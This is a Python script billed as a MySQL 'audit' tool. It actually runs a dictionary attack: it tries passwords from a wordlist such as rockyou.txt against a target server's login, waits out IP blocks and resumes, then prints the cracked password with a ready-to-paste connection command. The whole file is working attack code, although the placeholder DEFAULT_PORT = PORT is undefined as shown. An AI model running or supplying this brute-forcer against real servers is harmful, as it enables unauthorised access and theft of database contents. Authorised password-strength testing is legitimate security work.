#!/usr/bin/env python3

import time
import sys
import os
from typing import Optional, List, Dict
from datetime import datetime
import argparse
import json

try:
    import pymysql
    USE_PYMYSQL = True
except ImportError:
    print("❌ pymysql not installed. Install it with: pip install pymysql")
    sys.exit(1)

DEFAULT_HOST = "IP_ADDRESS"
DEFAULT_PORT = PORT
DEFAULT_USER = "DEFAULT_USER"
DEFAULT_PASSWORDS_FILE = "/home/.../rockyou.txt"

 #Choose your own options
DEFAULT_DELAY = 1.0
DEFAULT_MAX_TESTS = 10


class MySQLAuditPro:
    def __init__(self, host: str, port: int = 3306, delay: float = 1.0):
        self.host = host
        self.port = port
        self.delay = delay
        self.attempts = 0
        self.found = False
        self.blocked = False
        self.results = {}
        self.start_time = datetime.now()
        
    def test_credentials(self, user: str, password: str) -> tuple:
        self.attempts += 1
        
        try:
            conn = pymysql.connect(
                host=self.host,
                port=self.port,
                user=user,
                password=password,
                connect_timeout=5,
                charset='utf8mb4'
            )
            conn.close()
            return True, None
            
        except pymysql.Error as e:
            error_msg = str(e)
            
            if "blocked" in error_msg.lower():
                self.blocked = True
                return False, "blocked"
            
            return False, error_msg
            
        except Exception as e:
            return False, str(e)

    
    def audit_passwords(self, user: str, password_file: str, max_tests: int = 0) -> Optional[str]:
        print(f"\n{'='*70}")
        print(f"🔍 AUDIT MYSQL")
        print(f"{'='*70}")
        print(f"  📍 Cible    : {self.host}:{self.port}")
        print(f"  👤 User     : {user}")
        print(f"  📂 Fichier  : {password_file}")
        print(f"  ⏱️  Début    : {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*70}\n")
        
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            if not passwords:
                print("❌ Empty File")
                return None
                
            if max_tests > 0:
                passwords = passwords[:max_tests]
                print(f"📊 Test liited at {max_tests} passwords at {len(passwords)} unaible\n")
            else:
                print(f"📊 {len(passwords)} password to test\n")
            
            total = len(passwords)
            found_password = None
            
            for i, password in enumerate(passwords, 1):
                progress = int((i / total) * 40)
                bar = "█" * progress + "░" * (40 - progress)
                display_pass = password[:20] + '...' if len(password) > 20 else password
                print(f"\r[{i}/{total}] {bar} {progress*2.5:.0f}% - Test: '{display_pass}'", end='', flush=True)
                
                success, error = self.test_credentials(user, password)
                
                if success:
                    print(f"\n\n{'='*70}")
                    print(f"✅ SUCCÈS !")
                    print(f"{'='*70}")
                    print(f"  👤 User : {user}")
                    print(f"  🔑 Password : {password}")
                    print(f"  📝 Attempts : {self.attempts}")
                    print(f"{'='*70}")
                    print(f"\nConnexion : mysql -h {self.host} -P {self.port} -u {user} -p\"{password}\"")
                    
                    found_password = password
                    self.results[user] = {
                        'password': password,
                        'attempts': self.attempts,
                        'found_at': datetime.now().isoformat()
                    }
                    break
                    
                elif error == "blocked":
                    print(f"\n🚫 IP Blocked by MySQL ! Wait 5 minutes...")
                    time.sleep(300)
                    self.blocked = False
                
                if self.delay > 0:
                    time.sleep(self.delay)
            
            if not found_password:
                print(f"\n\n❌ No passwords founds for {user}")
                print(f"📈 Total attempts: {self.attempts}")
            
            return found_password
            
        except FileNotFoundError:
            print(f"\n❌ File not found: {password_file}")
            return None
        except KeyboardInterrupt:
            print(f"\n\n⚠️ Interupted by user")
            print(f"📈 Attempts: {self.attempts}")
            return None
        except Exception as e:
            print(f"\n❌ Error: {e}")
            return None

    
    def generate_report(self, output_file: str = "audit_report.json"):
        report = {
            'target': self.host,
            'port': self.port,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.now().isoformat(),
            'total_attempts': self.attempts,
            'results': self.results,
            'summary': {
                'success': len(self.results) > 0,
                'found_credentials': self.results
            }
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📄 Rapport generated: {output_file}")


def main():
    parser = argparse.ArgumentParser(description='Audit MySQL - Password testing')
    parser.add_argument('-H', '--host', default=DEFAULT_HOST, help='Owner MySQL')
    parser.add_argument('-P', '--port', type=int, default=DEFAULT_PORT, help='Port MySQL')
    parser.add_argument('-u', '--user', default=DEFAULT_USER, help='User to test')
    parser.add_argument('-p', '--password-file', default=DEFAULT_PASSWORDS_FILE, help='Password file')
    parser.add_argument('-n', '--max-tests', type=int, default=DEFAULT_MAX_TESTS, help='Max test')
    parser.add_argument('-d', '--delay', type=float, default=DEFAULT_DELAY, help='Delay between each attempts')
    parser.add_argument('--report', help='Generate JSON report')
    
    args = parser.parse_args()
    
    auditor = MySQLAuditPro(args.host, args.port, args.delay)
    
    try:
        auditor.audit_passwords(args.user, args.password_file, args.max_tests)
        
        if args.report:
            auditor.generate_report(args.report)
            
    except KeyboardInterrupt:
        print("\n\n⚠️ Audit Ended")
        if args.report:
            auditor.generate_report(args.report + ".interrupted.json")

if __name__ == "__main__":
    main()
